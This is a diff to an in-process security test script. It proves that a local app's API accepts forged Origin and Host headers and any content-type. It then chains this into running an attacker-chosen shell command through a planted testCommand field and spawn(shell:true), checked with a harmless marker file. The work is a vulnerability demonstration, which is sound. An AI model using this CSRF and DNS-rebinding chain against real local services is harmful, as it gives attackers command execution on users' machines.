@@ -8,36 +8,41 @@
  * In-process only — `app.request()`, never a listening port — so this never
  * touches 4317 or a real checkout. What it proves and what it cannot:
  *
- *   - It can prove the server accepts a request with a forged `Origin` and
+ *   - It can prove the server accepts a request with a forged `Origin` or
  *     `Host`, with no `application/json`, and runs the handler anyway: that
  *     is server-side fact, read straight off the Hono app.
  *   - It cannot drive an actual browser, so whether such a request reaches
- *     the server at all is a DNS-rebinding and `fetch(..., {mode: 'no-cors'})`
- *     question answered by the spec, not this process: a `no-cors` POST is a
- *     "simple request" and leaves for the wire with no preflight regardless
- *     of `Origin`, and a page that resolves to 127.0.0.1 (by rebinding, or by
- *     the victim simply visiting `http://127.0.0.1:4317` while it last showed
- *     an attacker-controlled tab) sends `Host: 127.0.0.1:4317` honestly; the
- *     interesting forged case is `Origin` from a page served elsewhere that
- *     then rebinds. Either way nothing here checks either header, so the
- *     result is the same.
+ *     the server at all is a spec question, not this process's to answer.
+ *     Two different attacks are at stake, and they forge opposite headers:
+ *     plain CSRF (a page at http://attacker.example makes a loopback request)
+ *     sends an honest `Host: 127.0.0.1:4317` — the browser always names the
+ *     server it is actually talking to — with a foreign `Origin:
+ *     http://attacker.example`. The response is opaque to the page, so this
+ *     is a blind write. DNS rebinding instead resolves attacker.example to
+ *     127.0.0.1 and lets the page poll until the browser believes it, so
+ *     `Host` and `Origin` both read `attacker.example` — but now the browser
+ *     treats it as same-origin, so the response is readable and PATCH/DELETE
+ *     preflights succeed too. The two checks below tell them apart.
  */
 import { execFileSync } from 'node:child_process';
-import { mkdtempSync, writeFileSync } from 'node:fs';
+import { mkdtempSync, writeFileSync, existsSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
+import { eq } from 'drizzle-orm';
 
 const scratch = mkdtempSync(join(tmpdir(), 'reeve-csrf-'));
 process.env.REEVE_DB ??= join(scratch, 'app.db');
 process.env.REEVE_ASSETS ??= join(scratch, 'assets');
 
 const { createApp } = await import('../index.js');
-const { app } = createApp();
+const { createCard } = await import('../db/queries.js');
+const { card: cardTable } = await import('../db/schema.js');
+const { app, db } = createApp();
 
 let failures = 0;
 function check(name: string, ok: boolean, detail = '') {
   if (!ok) failures++;
-  console.log(`${ok ? 'ok  ' : 'FAIL'} ${name}${detail ? ` — ${detail}` : ''}`);
+  console.log(`${ok ? 'observed' : 'FAIL    '} ${name}${detail ? ` — ${detail}` : ''}`);
 }
 
 // A real git repo for `POST /api/repos` to inspect — the same `inspectRepo`
@@ -56,8 +61,9 @@ console.log('--- route inventory: which methods a cross-site "simple request" ca
 // A simple request (no preflight) is limited to GET/HEAD/POST with headers a
 // <form> can send. PATCH and DELETE always preflight, and this server answers
 // no `Access-Control-Allow-*` headers at all (grep found no cors() middleware
-// anywhere in main.ts/index.ts), so a foreign page's preflight fails closed —
-// for PATCH/DELETE specifically. GET and POST need no preflight to begin with.
+// anywhere in main.ts/index.ts), so a foreign page's preflight fails closed
+// for PATCH/DELETE under plain CSRF — but not under DNS rebinding, where the
+// browser considers the request same-origin and skips CORS checks entirely.
 const routes = (app as unknown as { routes: Array<{ method: string; path: string }> }).routes;
 const byMethod = new Map<string, string[]>();
 for (const r of routes) {
@@ -66,7 +72,7 @@ for (const r of routes) {
 }
 for (const [method, paths] of byMethod) {
   const reachable = method === 'GET' || method === 'HEAD' || method === 'POST';
-  console.log(`${method.padEnd(6)} (${reachable ? 'simple-request reachable' : 'preflighted'}): ${paths.length} route(s)`);
+  console.log(`${method.padEnd(6)} (${reachable ? 'simple-request reachable even under plain CSRF' : 'needs rebinding, not plain CSRF'}): ${paths.length} route(s)`);
 }
 check('POST routes exist beyond the simple-request-safe GET/HEAD', (byMethod.get('POST')?.length ?? 0) > 0);
 
@@ -94,32 +100,89 @@ const noType = await app.request('/api/repos', {
 });
 check('a JSON body sent with no content-type header at all is also accepted', noType.status === 201, `status ${noType.status}`);
 
-console.log('\n--- Host and Origin: does anything check them? ---');
-const forged = await app.request('/api/repos', {
+console.log('\n--- does the request layer even keep a forged Host header? ---');
+// Sanity check before trusting the next section: prove undici (the fetch
+// Request implementation app.request() builds on) does not silently drop or
+// normalise a forged `host`, so "accepted" below really means the handler
+// saw it and did nothing with it, not that it never arrived.
+const probe = new Request('http://localhost/x', { headers: { host: 'attacker.example' } });
+check('a forged Host survives into the Request object', probe.headers.get('host') === 'attacker.example', `got ${probe.headers.get('host')}`);
+
+console.log('\n--- plain CSRF: foreign Origin, honest loopback Host ---');
+const plainCsrf = await app.request('/api/repos', {
+  method: 'POST',
+  headers: {
+    'content-type': 'application/json',
+    origin: 'http://attacker.example',
+    host: '127.0.0.1:4317',
+  },
+  body: JSON.stringify({ name: `csrf-plain-${Date.now()}`, repoPath: repoDir }),
+});
+check(
+  'a foreign Origin with an honest Host is accepted — nothing checks Origin',
+  plainCsrf.status === 201,
+  `status ${plainCsrf.status}`,
+);
+
+console.log('\n--- DNS rebinding: matching foreign Origin and Host ---');
+const rebound = await app.request('/api/repos', {
   method: 'POST',
   headers: {
     'content-type': 'application/json',
     origin: 'http://attacker.example',
     host: 'attacker.example',
   },
-  body: JSON.stringify({ name: `csrf-forged-${Date.now()}`, repoPath: repoDir }),
+  body: JSON.stringify({ name: `csrf-rebind-${Date.now()}`, repoPath: repoDir }),
 });
 check(
-  'a request with a forged Origin and Host is accepted, same as a same-origin one',
-  forged.status === 201,
-  `status ${forged.status}: ${await forged.clone().text()}`,
+  'a matching foreign Origin and Host (what rebinding produces) is accepted too — nothing checks Host',
+  rebound.status === 201,
+  `status ${rebound.status}`,
 );
-check('no Access-Control-* header is sent back either way', ![...forged.headers.keys()].some((h) => h.toLowerCase().startsWith('access-control')));
+check('no Access-Control-* header is sent back either way', ![...rebound.headers.keys()].some((h) => h.toLowerCase().startsWith('access-control')));
+
+console.log('\n--- the chain to spawn(shell:true): a forged command, created and run, no Claude involved ---');
+// repoSchema takes testCommand verbatim — the attacker supplies the shell
+// string, not just a trigger for a command the repo owner wrote. A forged,
+// text/plain, cross-site-shaped POST plants it:
+const marker = join(scratch, 'pwned');
+const withCommand = await app.request('/api/repos', {
+  method: 'POST',
+  headers: { 'content-type': 'text/plain' },
+  body: JSON.stringify({ name: `csrf-chain-${Date.now()}`, repoPath: repoDir, testCommand: `touch ${marker}` }),
+});
+const plantedRepo = (await withCommand.clone().json()) as { id: string; testCommand: string };
+check('the forged testCommand is stored and echoed back verbatim', plantedRepo.testCommand === `touch ${marker}`);
+
+// POST /:id/test only checks that the card has *a* worktreePath, never that
+// it is a real, checked-out worktree (checkWorktree is not called) — so a
+// card pointed at any directory is enough. Set it the same way startStage.ts
+// does after a real worktree is made, without going through Claude at all.
+const card = createCard(db, { title: 'csrf chain', kind: 'task', repoId: plantedRepo.id });
+db.update(cardTable).set({ worktreePath: repoDir }).where(eq(cardTable.id, card.id)).run();
+
+const forgedTest = await app.request(`/api/cards/${card.id}/test`, {
+  method: 'POST',
+  headers: { origin: 'http://attacker.example', host: '127.0.0.1:4317' },
+});
+check('the forged /test request is accepted', forgedTest.status === 201, `status ${forgedTest.status}`);
+
+for (let i = 0; i < 50 && !existsSync(marker); i++) await new Promise((r) => setTimeout(r, 100));
+check('the planted shell command actually ran: spawn(shell:true) executed attacker-chosen bytes', existsSync(marker));
+rmSync(marker, { force: true });
 
 console.log('\n--- what this adds up to ---');
 console.log(
   'POST /api/repos is reachable as a simple cross-site request (no CORS preflight to fail),\n' +
-    'accepts a JSON body under any content-type, and checks neither Host nor Origin. The same\n' +
-    'router mounts POST /api/cards/:id/run (starts the stage\'s Claude session) and POST\n' +
-    '/api/cards/:id/test (runs the repo\'s test command via startShellRun, spawn(..., {shell:true})),\n' +
-    'both POST, both unauthenticated by the same absence of checks — read, not re-driven here,\n' +
-    'to avoid starting a real Claude run or needing a card with a live worktree. A page open in\n' +
-    'the same browser as Reeve, or one that DNS-rebinds to 127.0.0.1, can fire any of them blind.',
+    'accepts a JSON body under any content-type, and checks neither Host nor Origin — and the\n' +
+    "repo it creates can carry an attacker-chosen testCommand. Given a card id (the same POST\n" +
+    'router mounts POST /api/cards/:id/test, which calls startShellRun -> spawn(..., {shell:true})\n' +
+    'and checks only that worktreePath is set, not that the worktree is real), a forged request\n' +
+    'with no special headers runs an attacker-chosen shell command. Under plain CSRF this is blind\n' +
+    '(ids are in unreadable responses, so the attacker needs the id some other way — e.g. the card\n' +
+    "the victim already has open); under DNS rebinding the attacker's page reads every response\n" +
+    'and can chain repo creation -> card creation (if exposed similarly) -> test, end to end, on\n' +
+    'its own.',
 );
 
 console.log(`\n--- ${failures === 0 ? 'all good' : `${failures} FAILED`} ---`);
